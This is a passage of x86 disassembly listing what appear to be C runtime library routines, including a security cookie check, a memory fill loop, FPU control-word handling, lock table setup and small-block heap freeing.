  413aec:	3b df                	cmp    %edi,%ebx
  413aee:	74 08                	je     0x413af8
  413af0:	8d b9 00 3c 00 00    	lea    0x3c00(%ecx),%edi
  413af6:	eb 28                	jmp    0x413b20
  413af8:	bf ff 7f 00 00       	mov    $0x7fff,%edi
  413afd:	eb 21                	jmp    0x413b20
  413aff:	33 db                	xor    %ebx,%ebx
  413b01:	3b c3                	cmp    %ebx,%eax
  413b03:	75 12                	jne    0x413b17
  413b05:	3b d3                	cmp    %ebx,%edx
  413b07:	75 0e                	jne    0x413b17
  413b09:	8b 45 08             	mov    0x8(%ebp),%eax
  413b0c:	89 58 04             	mov    %ebx,0x4(%eax)
  413b0f:	89 18                	mov    %ebx,(%eax)
  413b11:	66 89 58 08          	mov    %bx,0x8(%eax)
  413b15:	eb 4d                	jmp    0x413b64
  413b17:	8d b9 01 3c 00 00    	lea    0x3c01(%ecx),%edi
  413b1d:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  413b20:	8b ca                	mov    %edx,%ecx
  413b22:	c1 e9 15             	shr    $0x15,%ecx
  413b25:	c1 e0 0b             	shl    $0xb,%eax
  413b28:	0b c8                	or     %eax,%ecx
  413b2a:	0b 4d fc             	or     -0x4(%ebp),%ecx
  413b2d:	8b 45 08             	mov    0x8(%ebp),%eax
  413b30:	c1 e2 0b             	shl    $0xb,%edx
  413b33:	85 ce                	test   %ecx,%esi
  413b35:	89 48 04             	mov    %ecx,0x4(%eax)
  413b38:	89 10                	mov    %edx,(%eax)
  413b3a:	75 1f                	jne    0x413b5b
  413b3c:	8b 08                	mov    (%eax),%ecx
  413b3e:	8b 50 04             	mov    0x4(%eax),%edx
  413b41:	8b d9                	mov    %ecx,%ebx
  413b43:	d1 e2                	shl    %edx
  413b45:	c1 eb 1f             	shr    $0x1f,%ebx
  413b48:	0b d3                	or     %ebx,%edx
  413b4a:	03 c9                	add    %ecx,%ecx
  413b4c:	81 c7 ff ff 00 00    	add    $0xffff,%edi
  413b52:	85 d6                	test   %edx,%esi
  413b54:	89 50 04             	mov    %edx,0x4(%eax)
  413b57:	89 08                	mov    %ecx,(%eax)
  413b59:	74 e1                	je     0x413b3c
  413b5b:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  413b5e:	0b cf                	or     %edi,%ecx
  413b60:	66 89 48 08          	mov    %cx,0x8(%eax)
  413b64:	5f                   	pop    %edi
  413b65:	5e                   	pop    %esi
  413b66:	5b                   	pop    %ebx
  413b67:	c9                   	leave
  413b68:	c3                   	ret
  413b69:	55                   	push   %ebp
  413b6a:	8b ec                	mov    %esp,%ebp
  413b6c:	83 ec 2c             	sub    $0x2c,%esp
  413b6f:	a1 10 62 45 00       	mov    0x456210,%eax
  413b74:	33 45 04             	xor    0x4(%ebp),%eax
  413b77:	56                   	push   %esi
  413b78:	89 45 fc             	mov    %eax,-0x4(%ebp)
  413b7b:	57                   	push   %edi
  413b7c:	8d 45 08             	lea    0x8(%ebp),%eax
  413b7f:	50                   	push   %eax
  413b80:	8d 45 f0             	lea    -0x10(%ebp),%eax
  413b83:	50                   	push   %eax
  413b84:	e8 26 ff ff ff       	call   0x413aaf
  413b89:	59                   	pop    %ecx
  413b8a:	59                   	pop    %ecx
  413b8b:	8d 45 d4             	lea    -0x2c(%ebp),%eax
  413b8e:	50                   	push   %eax
  413b8f:	6a 00                	push   $0x0
  413b91:	6a 11                	push   $0x11
  413b93:	83 ec 0c             	sub    $0xc,%esp
  413b96:	8d 75 f0             	lea    -0x10(%ebp),%esi
  413b99:	8b fc                	mov    %esp,%edi
  413b9b:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  413b9c:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  413b9d:	66 a5                	movsw  %ds:(%esi),%es:(%edi)
  413b9f:	e8 a3 28 00 00       	call   0x416447
  413ba4:	8b 75 10             	mov    0x10(%ebp),%esi
  413ba7:	8b 7d 14             	mov    0x14(%ebp),%edi
  413baa:	89 46 08             	mov    %eax,0x8(%esi)
  413bad:	0f be 45 d6          	movsbl -0x2a(%ebp),%eax
  413bb1:	89 06                	mov    %eax,(%esi)
  413bb3:	0f bf 45 d4          	movswl -0x2c(%ebp),%eax
  413bb7:	89 46 04             	mov    %eax,0x4(%esi)
  413bba:	8d 45 d8             	lea    -0x28(%ebp),%eax
  413bbd:	50                   	push   %eax
  413bbe:	57                   	push   %edi
  413bbf:	e8 7c fd ff ff       	call   0x413940
  413bc4:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  413bc7:	33 4d 04             	xor    0x4(%ebp),%ecx
  413bca:	83 c4 20             	add    $0x20,%esp
  413bcd:	89 7e 0c             	mov    %edi,0xc(%esi)
  413bd0:	8b c6                	mov    %esi,%eax
  413bd2:	e8 35 00 00 00       	call   0x413c0c
  413bd7:	5f                   	pop    %edi
  413bd8:	5e                   	pop    %esi
  413bd9:	c9                   	leave
  413bda:	c3                   	ret
  413bdb:	6a 08                	push   $0x8
  413bdd:	68 a0 85 41 00       	push   $0x4185a0
  413be2:	e8 2d f4 ff ff       	call   0x413014
  413be7:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  413beb:	6a 00                	push   $0x0
  413bed:	6a 01                	push   $0x1
  413bef:	e8 3d 2b 00 00       	call   0x416731
  413bf4:	59                   	pop    %ecx
  413bf5:	59                   	pop    %ecx
  413bf6:	eb 07                	jmp    0x413bff
  413bf8:	33 c0                	xor    %eax,%eax
  413bfa:	40                   	inc    %eax
  413bfb:	c3                   	ret
  413bfc:	8b 65 e8             	mov    -0x18(%ebp),%esp
  413bff:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
  413c03:	6a 03                	push   $0x3
  413c05:	ff 15 38 80 41 00    	call   *0x418038
  413c0b:	cc                   	int3
  413c0c:	3b 0d 10 62 45 00    	cmp    0x456210,%ecx
  413c12:	75 01                	jne    0x413c15
  413c14:	c3                   	ret
  413c15:	e9 c1 ff ff ff       	jmp    0x413bdb
  413c1a:	cc                   	int3
  413c1b:	cc                   	int3
  413c1c:	cc                   	int3
  413c1d:	cc                   	int3
  413c1e:	cc                   	int3
  413c1f:	cc                   	int3
  413c20:	8b 54 24 0c          	mov    0xc(%esp),%edx
  413c24:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  413c28:	85 d2                	test   %edx,%edx
  413c2a:	74 4f                	je     0x413c7b
  413c2c:	33 c0                	xor    %eax,%eax
  413c2e:	8a 44 24 08          	mov    0x8(%esp),%al
  413c32:	57                   	push   %edi
  413c33:	8b f9                	mov    %ecx,%edi
  413c35:	83 fa 04             	cmp    $0x4,%edx
  413c38:	72 31                	jb     0x413c6b
  413c3a:	f7 d9                	neg    %ecx
  413c3c:	83 e1 03             	and    $0x3,%ecx
  413c3f:	74 0c                	je     0x413c4d
  413c41:	2b d1                	sub    %ecx,%edx
  413c43:	88 07                	mov    %al,(%edi)
  413c45:	83 c7 01             	add    $0x1,%edi
  413c48:	83 e9 01             	sub    $0x1,%ecx
  413c4b:	75 f6                	jne    0x413c43
  413c4d:	8b c8                	mov    %eax,%ecx
  413c4f:	c1 e0 08             	shl    $0x8,%eax
  413c52:	03 c1                	add    %ecx,%eax
  413c54:	8b c8                	mov    %eax,%ecx
  413c56:	c1 e0 10             	shl    $0x10,%eax
  413c59:	03 c1                	add    %ecx,%eax
  413c5b:	8b ca                	mov    %edx,%ecx
  413c5d:	83 e2 03             	and    $0x3,%edx
  413c60:	c1 e9 02             	shr    $0x2,%ecx
  413c63:	74 06                	je     0x413c6b
  413c65:	f3 ab                	rep stos %eax,%es:(%edi)
  413c67:	85 d2                	test   %edx,%edx
  413c69:	74 0a                	je     0x413c75
  413c6b:	88 07                	mov    %al,(%edi)
  413c6d:	83 c7 01             	add    $0x1,%edi
  413c70:	83 ea 01             	sub    $0x1,%edx
  413c73:	75 f6                	jne    0x413c6b
  413c75:	8b 44 24 08          	mov    0x8(%esp),%eax
  413c79:	5f                   	pop    %edi
  413c7a:	c3                   	ret
  413c7b:	8b 44 24 04          	mov    0x4(%esp),%eax
  413c7f:	c3                   	ret
  413c80:	6a 02                	push   $0x2
  413c82:	e8 9a de ff ff       	call   0x411b21
  413c87:	59                   	pop    %ecx
  413c88:	c3                   	ret
  413c89:	33 c0                	xor    %eax,%eax
  413c8b:	f6 c3 01             	test   $0x1,%bl
  413c8e:	74 03                	je     0x413c93
  413c90:	6a 10                	push   $0x10
  413c92:	58                   	pop    %eax
  413c93:	f6 c3 04             	test   $0x4,%bl
  413c96:	74 03                	je     0x413c9b
  413c98:	83 c8 08             	or     $0x8,%eax
  413c9b:	f6 c3 08             	test   $0x8,%bl
  413c9e:	74 03                	je     0x413ca3
  413ca0:	83 c8 04             	or     $0x4,%eax
  413ca3:	f6 c3 10             	test   $0x10,%bl
  413ca6:	74 03                	je     0x413cab
  413ca8:	83 c8 02             	or     $0x2,%eax
  413cab:	f6 c3 20             	test   $0x20,%bl
  413cae:	74 03                	je     0x413cb3
  413cb0:	83 c8 01             	or     $0x1,%eax
  413cb3:	f6 c3 02             	test   $0x2,%bl
  413cb6:	74 05                	je     0x413cbd
  413cb8:	0d 00 00 08 00       	or     $0x80000,%eax
  413cbd:	55                   	push   %ebp
  413cbe:	0f b7 d3             	movzwl %bx,%edx
  413cc1:	56                   	push   %esi
  413cc2:	8b ca                	mov    %edx,%ecx
  413cc4:	be 00 0c 00 00       	mov    $0xc00,%esi
  413cc9:	23 ce                	and    %esi,%ecx
  413ccb:	57                   	push   %edi
  413ccc:	bf 00 03 00 00       	mov    $0x300,%edi
  413cd1:	bd 00 02 00 00       	mov    $0x200,%ebp
  413cd6:	74 21                	je     0x413cf9
  413cd8:	81 f9 00 04 00 00    	cmp    $0x400,%ecx
  413cde:	74 14                	je     0x413cf4
  413ce0:	81 f9 00 08 00 00    	cmp    $0x800,%ecx
  413ce6:	74 08                	je     0x413cf0
  413ce8:	3b ce                	cmp    %esi,%ecx
  413cea:	75 0d                	jne    0x413cf9
  413cec:	0b c7                	or     %edi,%eax
  413cee:	eb 09                	jmp    0x413cf9
  413cf0:	0b c5                	or     %ebp,%eax
  413cf2:	eb 05                	jmp    0x413cf9
  413cf4:	0d 00 01 00 00       	or     $0x100,%eax
  413cf9:	23 d7                	and    %edi,%edx
  413cfb:	74 0b                	je     0x413d08
  413cfd:	3b d5                	cmp    %ebp,%edx
  413cff:	75 0c                	jne    0x413d0d
  413d01:	0d 00 00 01 00       	or     $0x10000,%eax
  413d06:	eb 05                	jmp    0x413d0d
  413d08:	0d 00 00 02 00       	or     $0x20000,%eax
  413d0d:	f6 c7 10             	test   $0x10,%bh
  413d10:	5f                   	pop    %edi
  413d11:	5e                   	pop    %esi
  413d12:	5d                   	pop    %ebp
  413d13:	74 05                	je     0x413d1a
  413d15:	0d 00 00 04 00       	or     $0x40000,%eax
  413d1a:	c3                   	ret
  413d1b:	33 c0                	xor    %eax,%eax
  413d1d:	f6 c3 10             	test   $0x10,%bl
  413d20:	74 01                	je     0x413d23
  413d22:	40                   	inc    %eax
  413d23:	f6 c3 08             	test   $0x8,%bl
  413d26:	74 03                	je     0x413d2b
  413d28:	83 c8 04             	or     $0x4,%eax
  413d2b:	f6 c3 04             	test   $0x4,%bl
  413d2e:	74 03                	je     0x413d33
  413d30:	83 c8 08             	or     $0x8,%eax
  413d33:	f6 c3 02             	test   $0x2,%bl
  413d36:	74 03                	je     0x413d3b
  413d38:	83 c8 10             	or     $0x10,%eax
  413d3b:	f6 c3 01             	test   $0x1,%bl
  413d3e:	74 03                	je     0x413d43
  413d40:	83 c8 20             	or     $0x20,%eax
  413d43:	f7 c3 00 00 08 00    	test   $0x80000,%ebx
  413d49:	74 03                	je     0x413d4e
  413d4b:	83 c8 02             	or     $0x2,%eax
  413d4e:	8b cb                	mov    %ebx,%ecx
  413d50:	ba 00 03 00 00       	mov    $0x300,%edx
  413d55:	23 ca                	and    %edx,%ecx
  413d57:	56                   	push   %esi
  413d58:	be 00 02 00 00       	mov    $0x200,%esi
  413d5d:	74 23                	je     0x413d82
  413d5f:	81 f9 00 01 00 00    	cmp    $0x100,%ecx
  413d65:	74 16                	je     0x413d7d
  413d67:	3b ce                	cmp    %esi,%ecx
  413d69:	74 0b                	je     0x413d76
  413d6b:	3b ca                	cmp    %edx,%ecx
  413d6d:	75 13                	jne    0x413d82
  413d6f:	0d 00 0c 00 00       	or     $0xc00,%eax
  413d74:	eb 0c                	jmp    0x413d82
  413d76:	0d 00 08 00 00       	or     $0x800,%eax
  413d7b:	eb 05                	jmp    0x413d82
  413d7d:	0d 00 04 00 00       	or     $0x400,%eax
  413d82:	8b cb                	mov    %ebx,%ecx
  413d84:	81 e1 00 00 03 00    	and    $0x30000,%ecx
  413d8a:	74 0c                	je     0x413d98
  413d8c:	81 f9 00 00 01 00    	cmp    $0x10000,%ecx
  413d92:	75 06                	jne    0x413d9a
  413d94:	0b c6                	or     %esi,%eax
  413d96:	eb 02                	jmp    0x413d9a
  413d98:	0b c2                	or     %edx,%eax
  413d9a:	f7 c3 00 00 04 00    	test   $0x40000,%ebx
  413da0:	5e                   	pop    %esi
  413da1:	74 05                	je     0x413da8
  413da3:	0d 00 10 00 00       	or     $0x1000,%eax
  413da8:	c3                   	ret
  413da9:	55                   	push   %ebp
  413daa:	8b ec                	mov    %esp,%ebp
  413dac:	51                   	push   %ecx
  413dad:	53                   	push   %ebx
  413dae:	9b d9 7d fc          	fstcw  -0x4(%ebp)
  413db2:	8b 5d fc             	mov    -0x4(%ebp),%ebx
  413db5:	e8 cf fe ff ff       	call   0x413c89
  413dba:	8b d8                	mov    %eax,%ebx
  413dbc:	8b 45 0c             	mov    0xc(%ebp),%eax
  413dbf:	f7 d0                	not    %eax
  413dc1:	23 d8                	and    %eax,%ebx
  413dc3:	8b 45 08             	mov    0x8(%ebp),%eax
  413dc6:	23 45 0c             	and    0xc(%ebp),%eax
  413dc9:	0b d8                	or     %eax,%ebx
  413dcb:	e8 4b ff ff ff       	call   0x413d1b
  413dd0:	89 45 0c             	mov    %eax,0xc(%ebp)
  413dd3:	d9 6d 0c             	fldcw  0xc(%ebp)
  413dd6:	8b c3                	mov    %ebx,%eax
  413dd8:	5b                   	pop    %ebx
  413dd9:	c9                   	leave
  413dda:	c3                   	ret
  413ddb:	8b 44 24 08          	mov    0x8(%esp),%eax
  413ddf:	25 ff ff f7 ff       	and    $0xfff7ffff,%eax
  413de4:	50                   	push   %eax
  413de5:	ff 74 24 08          	push   0x8(%esp)
  413de9:	e8 bb ff ff ff       	call   0x413da9
  413dee:	59                   	pop    %ecx
  413def:	59                   	pop    %ecx
  413df0:	c3                   	ret
  413df1:	56                   	push   %esi
  413df2:	57                   	push   %edi
  413df3:	33 f6                	xor    %esi,%esi
  413df5:	bf e8 6d 45 00       	mov    $0x456de8,%edi
  413dfa:	83 3c f5 24 62 45 00 	cmpl   $0x1,0x456224(,%esi,8)
  413e01:	01 
  413e02:	75 1e                	jne    0x413e22
  413e04:	8d 04 f5 20 62 45 00 	lea    0x456220(,%esi,8),%eax
  413e0b:	89 38                	mov    %edi,(%eax)
  413e0d:	68 a0 0f 00 00       	push   $0xfa0
  413e12:	ff 30                	push   (%eax)
  413e14:	83 c7 18             	add    $0x18,%edi
  413e17:	e8 11 18 00 00       	call   0x41562d
  413e1c:	85 c0                	test   %eax,%eax
  413e1e:	59                   	pop    %ecx
  413e1f:	59                   	pop    %ecx
  413e20:	74 0c                	je     0x413e2e
  413e22:	46                   	inc    %esi
  413e23:	83 fe 24             	cmp    $0x24,%esi
  413e26:	7c d2                	jl     0x413dfa
  413e28:	33 c0                	xor    %eax,%eax
  413e2a:	40                   	inc    %eax
  413e2b:	5f                   	pop    %edi
  413e2c:	5e                   	pop    %esi
  413e2d:	c3                   	ret
  413e2e:	83 24 f5 20 62 45 00 	andl   $0x0,0x456220(,%esi,8)
  413e35:	00 
  413e36:	33 c0                	xor    %eax,%eax
  413e38:	eb f1                	jmp    0x413e2b
  413e3a:	53                   	push   %ebx
  413e3b:	8b 1d 20 80 41 00    	mov    0x418020,%ebx
  413e41:	56                   	push   %esi
  413e42:	be 20 62 45 00       	mov    $0x456220,%esi
  413e47:	57                   	push   %edi
  413e48:	8b 3e                	mov    (%esi),%edi
  413e4a:	85 ff                	test   %edi,%edi
  413e4c:	74 13                	je     0x413e61
  413e4e:	83 7e 04 01          	cmpl   $0x1,0x4(%esi)
  413e52:	74 0d                	je     0x413e61
  413e54:	57                   	push   %edi
  413e55:	ff d3                	call   *%ebx
  413e57:	57                   	push   %edi
  413e58:	e8 6d e3 ff ff       	call   0x4121ca
  413e5d:	83 26 00             	andl   $0x0,(%esi)
  413e60:	59                   	pop    %ecx
  413e61:	83 c6 08             	add    $0x8,%esi
  413e64:	81 fe 40 63 45 00    	cmp    $0x456340,%esi
  413e6a:	7c dc                	jl     0x413e48
  413e6c:	be 20 62 45 00       	mov    $0x456220,%esi
  413e71:	5f                   	pop    %edi
  413e72:	8b 06                	mov    (%esi),%eax
  413e74:	85 c0                	test   %eax,%eax
  413e76:	74 09                	je     0x413e81
  413e78:	83 7e 04 01          	cmpl   $0x1,0x4(%esi)
  413e7c:	75 03                	jne    0x413e81
  413e7e:	50                   	push   %eax
  413e7f:	ff d3                	call   *%ebx
  413e81:	83 c6 08             	add    $0x8,%esi
  413e84:	81 fe 40 63 45 00    	cmp    $0x456340,%esi
  413e8a:	7c e6                	jl     0x413e72
  413e8c:	5e                   	pop    %esi
  413e8d:	5b                   	pop    %ebx
  413e8e:	c3                   	ret
  413e8f:	55                   	push   %ebp
  413e90:	8b ec                	mov    %esp,%ebp
  413e92:	8b 45 08             	mov    0x8(%ebp),%eax
  413e95:	ff 34 c5 20 62 45 00 	push   0x456220(,%eax,8)
  413e9c:	ff 15 e8 80 41 00    	call   *0x4180e8
  413ea2:	5d                   	pop    %ebp
  413ea3:	c3                   	ret
  413ea4:	55                   	push   %ebp
  413ea5:	8b ec                	mov    %esp,%ebp
  413ea7:	56                   	push   %esi
  413ea8:	8b 75 08             	mov    0x8(%ebp),%esi
  413eab:	8d 34 f5 20 62 45 00 	lea    0x456220(,%esi,8),%esi
  413eb2:	83 3e 00             	cmpl   $0x0,(%esi)
  413eb5:	74 05                	je     0x413ebc
  413eb7:	33 c0                	xor    %eax,%eax
  413eb9:	40                   	inc    %eax
  413eba:	eb 64                	jmp    0x413f20
  413ebc:	57                   	push   %edi
  413ebd:	6a 18                	push   $0x18
  413ebf:	e8 1e e4 ff ff       	call   0x4122e2
  413ec4:	8b f8                	mov    %eax,%edi
  413ec6:	85 ff                	test   %edi,%edi
  413ec8:	59                   	pop    %ecx
  413ec9:	75 0f                	jne    0x413eda
  413ecb:	e8 ab 29 00 00       	call   0x41687b
  413ed0:	c7 00 0c 00 00 00    	movl   $0xc,(%eax)
  413ed6:	33 c0                	xor    %eax,%eax
  413ed8:	eb 45                	jmp    0x413f1f
  413eda:	6a 0a                	push   $0xa
  413edc:	e8 42 00 00 00       	call   0x413f23
  413ee1:	83 3e 00             	cmpl   $0x0,(%esi)
  413ee4:	59                   	pop    %ecx
  413ee5:	75 26                	jne    0x413f0d
  413ee7:	68 a0 0f 00 00       	push   $0xfa0
  413eec:	57                   	push   %edi
  413eed:	e8 3b 17 00 00       	call   0x41562d
  413ef2:	85 c0                	test   %eax,%eax
  413ef4:	59                   	pop    %ecx
  413ef5:	59                   	pop    %ecx
  413ef6:	75 11                	jne    0x413f09
  413ef8:	57                   	push   %edi
  413ef9:	e8 cc e2 ff ff       	call   0x4121ca
  413efe:	6a 0a                	push   $0xa
  413f00:	e8 8a ff ff ff       	call   0x413e8f
  413f05:	59                   	pop    %ecx
  413f06:	59                   	pop    %ecx
  413f07:	eb c2                	jmp    0x413ecb
  413f09:	89 3e                	mov    %edi,(%esi)
  413f0b:	eb 07                	jmp    0x413f14
  413f0d:	57                   	push   %edi
  413f0e:	e8 b7 e2 ff ff       	call   0x4121ca
  413f13:	59                   	pop    %ecx
  413f14:	6a 0a                	push   $0xa
  413f16:	e8 74 ff ff ff       	call   0x413e8f
  413f1b:	33 c0                	xor    %eax,%eax
  413f1d:	59                   	pop    %ecx
  413f1e:	40                   	inc    %eax
  413f1f:	5f                   	pop    %edi
  413f20:	5e                   	pop    %esi
  413f21:	5d                   	pop    %ebp
  413f22:	c3                   	ret
  413f23:	55                   	push   %ebp
  413f24:	8b ec                	mov    %esp,%ebp
  413f26:	8b 45 08             	mov    0x8(%ebp),%eax
  413f29:	56                   	push   %esi
  413f2a:	8d 34 c5 20 62 45 00 	lea    0x456220(,%eax,8),%esi
  413f31:	83 3e 00             	cmpl   $0x0,(%esi)
  413f34:	75 13                	jne    0x413f49
  413f36:	50                   	push   %eax
  413f37:	e8 68 ff ff ff       	call   0x413ea4
  413f3c:	85 c0                	test   %eax,%eax
  413f3e:	59                   	pop    %ecx
  413f3f:	75 08                	jne    0x413f49
  413f41:	6a 11                	push   $0x11
  413f43:	e8 d9 db ff ff       	call   0x411b21
  413f48:	59                   	pop    %ecx
  413f49:	ff 36                	push   (%esi)
  413f4b:	ff 15 ec 80 41 00    	call   *0x4180ec
  413f51:	5e                   	pop    %esi
  413f52:	5d                   	pop    %ebp
  413f53:	c3                   	ret
  413f54:	68 40 01 00 00       	push   $0x140
  413f59:	6a 00                	push   $0x0
  413f5b:	ff 35 3c 73 45 00    	push   0x45733c
  413f61:	ff 15 8c 80 41 00    	call   *0x41808c
  413f67:	85 c0                	test   %eax,%eax
  413f69:	a3 28 73 45 00       	mov    %eax,0x457328
  413f6e:	75 01                	jne    0x413f71
  413f70:	c3                   	ret
  413f71:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  413f75:	83 25 20 73 45 00 00 	andl   $0x0,0x457320
  413f7c:	83 25 24 73 45 00 00 	andl   $0x0,0x457324
  413f83:	a3 30 73 45 00       	mov    %eax,0x457330
  413f88:	33 c0                	xor    %eax,%eax
  413f8a:	89 0d 2c 73 45 00    	mov    %ecx,0x45732c
  413f90:	c7 05 34 73 45 00 10 	movl   $0x10,0x457334
  413f97:	00 00 00 
  413f9a:	40                   	inc    %eax
  413f9b:	c3                   	ret
  413f9c:	a1 24 73 45 00       	mov    0x457324,%eax
  413fa1:	8d 0c 80             	lea    (%eax,%eax,4),%ecx
  413fa4:	a1 28 73 45 00       	mov    0x457328,%eax
  413fa9:	8d 0c 88             	lea    (%eax,%ecx,4),%ecx
  413fac:	eb 12                	jmp    0x413fc0
  413fae:	8b 54 24 04          	mov    0x4(%esp),%edx
  413fb2:	2b 50 0c             	sub    0xc(%eax),%edx
  413fb5:	81 fa 00 00 10 00    	cmp    $0x100000,%edx
  413fbb:	72 09                	jb     0x413fc6
  413fbd:	83 c0 14             	add    $0x14,%eax
  413fc0:	3b c1                	cmp    %ecx,%eax
  413fc2:	72 ea                	jb     0x413fae
  413fc4:	33 c0                	xor    %eax,%eax
  413fc6:	c3                   	ret
  413fc7:	55                   	push   %ebp
  413fc8:	8b ec                	mov    %esp,%ebp
  413fca:	83 ec 10             	sub    $0x10,%esp
  413fcd:	8b 4d 08             	mov    0x8(%ebp),%ecx
  413fd0:	8b 41 10             	mov    0x10(%ecx),%eax
  413fd3:	56                   	push   %esi
  413fd4:	8b 75 0c             	mov    0xc(%ebp),%esi
  413fd7:	57                   	push   %edi
  413fd8:	8b fe                	mov    %esi,%edi
  413fda:	2b 79 0c             	sub    0xc(%ecx),%edi
  413fdd:	83 c6 fc             	add    $0xfffffffc,%esi
  413fe0:	c1 ef 0f             	shr    $0xf,%edi
  413fe3:	8b cf                	mov    %edi,%ecx
  413fe5:	69 c9 04 02 00 00    	imul   $0x204,%ecx,%ecx
  413feb:	8d 8c 01 44 01 00 00 	lea    0x144(%ecx,%eax,1),%ecx
  413ff2:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  413ff5:	8b 0e                	mov    (%esi),%ecx
  413ff7:	49                   	dec    %ecx
  413ff8:	f6 c1 01             	test   $0x1,%cl
  413ffb:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  413ffe:	0f 85 d7 02 00 00    	jne    0x4142db
  414004:	53                   	push   %ebx
  414005:	8d 1c 31             	lea    (%ecx,%esi,1),%ebx
  414008:	8b 13                	mov    (%ebx),%edx
  41400a:	89 55 f4             	mov    %edx,-0xc(%ebp)
  41400d:	8b 56 fc             	mov    -0x4(%esi),%edx
  414010:	89 55 f8             	mov    %edx,-0x8(%ebp)
  414013:	8b 55 f4             	mov    -0xc(%ebp),%edx
  414016:	f6 c2 01             	test   $0x1,%dl
  414019:	89 5d 0c             	mov    %ebx,0xc(%ebp)
  41401c:	75 74                	jne    0x414092
  41401e:	c1 fa 04             	sar    $0x4,%edx
  414021:	4a                   	dec    %edx
  414022:	83 fa 3f             	cmp    $0x3f,%edx
  414025:	76 03                	jbe    0x41402a
  414027:	6a 3f                	push   $0x3f
  414029:	5a                   	pop    %edx
  41402a:	8b 4b 04             	mov    0x4(%ebx),%ecx
  41402d:	3b 4b 08             	cmp    0x8(%ebx),%ecx
  414030:	75 42                	jne    0x414074
  414032:	83 fa 20             	cmp    $0x20,%edx
  414035:	bb 00 00 00 80       	mov    $0x80000000,%ebx
  41403a:	73 19                	jae    0x414055
  41403c:	8b ca                	mov    %edx,%ecx
  41403e:	d3 eb                	shr    %cl,%ebx
  414040:	8d 4c 02 04          	lea    0x4(%edx,%eax,1),%ecx
  414044:	f7 d3                	not    %ebx
  414046:	21 5c b8 44          	and    %ebx,0x44(%eax,%edi,4)
  41404a:	fe 09                	decb   (%ecx)
  41404c:	75 23                	jne    0x414071
  41404e:	8b 4d 08             	mov    0x8(%ebp),%ecx
  414051:	21 19                	and    %ebx,(%ecx)
  414053:	eb 1c                	jmp    0x414071
  414055:	8d 4a e0             	lea    -0x20(%edx),%ecx
  414058:	d3 eb                	shr    %cl,%ebx
  41405a:	8d 4c 02 04          	lea    0x4(%edx,%eax,1),%ecx
  41405e:	f7 d3                	not    %ebx
  414060:	21 9c b8 c4 00 00 00 	and    %ebx,0xc4(%eax,%edi,4)
  414067:	fe 09                	decb   (%ecx)
  414069:	75 06                	jne    0x414071
  41406b:	8b 4d 08             	mov    0x8(%ebp),%ecx
  41406e:	21 59 04             	and    %ebx,0x4(%ecx)
  414071:	8b 5d 0c             	mov    0xc(%ebp),%ebx
  414074:	8b 53 08             	mov    0x8(%ebx),%edx
  414077:	8b 5b 04             	mov    0x4(%ebx),%ebx
  41407a:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  41407d:	03 4d f4             	add    -0xc(%ebp),%ecx
  414080:	89 5a 04             	mov    %ebx,0x4(%edx)
  414083:	8b 55 0c             	mov    0xc(%ebp),%edx
  414086:	8b 5a 04             	mov    0x4(%edx),%ebx
  414089:	8b 52 08             	mov    0x8(%edx),%edx
  41408c:	89 53 08             	mov    %edx,0x8(%ebx)
  41408f:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  414092:	8b d1                	mov    %ecx,%edx
  414094:	c1 fa 04             	sar    $0x4,%edx
  414097:	4a                   	dec    %edx
  414098:	83 fa 3f             	cmp    $0x3f,%edx
  41409b:	76 03                	jbe    0x4140a0
  41409d:	6a 3f                	push   $0x3f
  41409f:	5a                   	pop    %edx
  4140a0:	8b 5d f8             	mov    -0x8(%ebp),%ebx
  4140a3:	83 e3 01             	and    $0x1,%ebx
  4140a6:	89 5d f4             	mov    %ebx,-0xc(%ebp)
  4140a9:	0f 85 8f 00 00 00    	jne    0x41413e
  4140af:	2b 75 f8             	sub    -0x8(%ebp),%esi
  4140b2:	8b 5d f8             	mov    -0x8(%ebp),%ebx
  4140b5:	c1 fb 04             	sar    $0x4,%ebx
  4140b8:	6a 3f                	push   $0x3f
  4140ba:	89 75 0c             	mov    %esi,0xc(%ebp)
  4140bd:	4b                   	dec    %ebx
  4140be:	5e                   	pop    %esi
  4140bf:	3b de                	cmp    %esi,%ebx
  4140c1:	76 02                	jbe    0x4140c5
  4140c3:	8b de                	mov    %esi,%ebx
  4140c5:	03 4d f8             	add    -0x8(%ebp),%ecx
  4140c8:	8b d1                	mov    %ecx,%edx
  4140ca:	c1 fa 04             	sar    $0x4,%edx
  4140cd:	4a                   	dec    %edx
  4140ce:	3b d6                	cmp    %esi,%edx
  4140d0:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  4140d3:	76 02                	jbe    0x4140d7
  4140d5:	8b d6                	mov    %esi,%edx
  4140d7:	3b da                	cmp    %edx,%ebx
  4140d9:	74 5e                	je     0x414139
  4140db:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  4140de:	8b 71 04             	mov    0x4(%ecx),%esi
  4140e1:	3b 71 08             	cmp    0x8(%ecx),%esi
  4140e4:	75 3b                	jne    0x414121
  4140e6:	83 fb 20             	cmp    $0x20,%ebx
  4140e9:	be 00 00 00 80       	mov    $0x80000000,%esi
  4140ee:	73 17                	jae    0x414107
  4140f0:	8b cb                	mov    %ebx,%ecx
  4140f2:	d3 ee                	shr    %cl,%esi
  4140f4:	f7 d6                	not    %esi
  4140f6:	21 74 b8 44          	and    %esi,0x44(%eax,%edi,4)
  4140fa:	fe 4c 03 04          	decb   0x4(%ebx,%eax,1)
  4140fe:	75 21                	jne    0x414121
  414100:	8b 4d 08             	mov    0x8(%ebp),%ecx
  414103:	21 31                	and    %esi,(%ecx)
  414105:	eb 1a                	jmp    0x414121
  414107:	8d 4b e0             	lea    -0x20(%ebx),%ecx
  41410a:	d3 ee                	shr    %cl,%esi
  41410c:	f7 d6                	not    %esi
  41410e:	21 b4 b8 c4 00 00 00 	and    %esi,0xc4(%eax,%edi,4)
  414115:	fe 4c 03 04          	decb   0x4(%ebx,%eax,1)
  414119:	75 06                	jne    0x414121
